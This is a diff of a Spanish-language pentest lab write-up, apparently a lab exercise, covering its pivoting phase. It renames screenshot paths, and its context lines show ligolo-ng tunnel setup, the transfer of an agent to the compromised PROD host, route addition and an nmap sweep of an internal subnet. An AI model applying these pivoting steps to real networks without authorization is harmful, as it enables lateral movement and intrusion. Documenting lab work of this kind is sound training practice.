@@ -18,7 +18,7 @@ Tras comprometer PROD se confirma visibilidad hacia `10.0.3.0/24` (interfaz `enp
 ---
 
 ### 3.1 — Proxy en Kali
-> 📸 Captura: ![fase3-01](../../screenshots/FASE-3-Pivoting/fase3-01-ligolo-proxy-listening.png)
+> 📸 Captura: ![fase03-01](../../screenshots/FASE-03-Pivoting/fase03-01-ligolo-proxy-listening.png)
 
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
@@ -37,7 +37,7 @@ ligolo-ng »
 
 ### 3.2 — Agent en PROD
 **Técnica MITRE:** T1105 — Ingress Tool Transfer  
-> 📸 Captura: ![fase3-02](../../screenshots/FASE-3-Pivoting/fase3-02-ligolo-agent-connected.png)
+> 📸 Captura: ![fase03-02](../../screenshots/FASE-03-Pivoting/fase03-02-ligolo-agent-connected.png)
 
 ```bash
 # Kali → transferir agent
@@ -56,7 +56,7 @@ INFO[0297] Agent joined.  id=badd2b6e  name=thomas@prod  remote=10.0.2.200:52232
 ---
 
 ### 3.3 — Activar túnel e ifconfig
-> 📸 Captura: ![fase3-03](../../screenshots/FASE-3-Pivoting/fase3-03-ligolo-tunnel-active.png)
+> 📸 Captura: ![fase03-03](../../screenshots/FASE-03-Pivoting/fase03-03-ligolo-tunnel-active.png)
 
 ```
 ligolo-ng » session
@@ -78,7 +78,7 @@ ligolo-ng » session
 ---
 
 ### 3.4 — Ruta en Kali
-> 📸 Captura: ![fase3-04](../../screenshots/FASE-3-Pivoting/fase3-04-route-added-kali.png)
+> 📸 Captura: ![fase03-04](../../screenshots/FASE-03-Pivoting/fase03-04-route-added-kali.png)
 
 ```bash
 sudo ip route add 10.0.3.0/24 dev ligolo
@@ -92,7 +92,7 @@ ip route | grep ligolo
 ---
 
 ### 3.5 — Verificación de conectividad
-> 📸 Captura: ![fase3-05](../../screenshots/FASE-3-Pivoting/fase3-05-nmap-through-tunnel.png)
+> 📸 Captura: ![fase03-05](../../screenshots/FASE-03-Pivoting/fase03-05-nmap-through-tunnel.png)
 
 ```bash
 nmap -sn --unprivileged 10.0.3.0/24
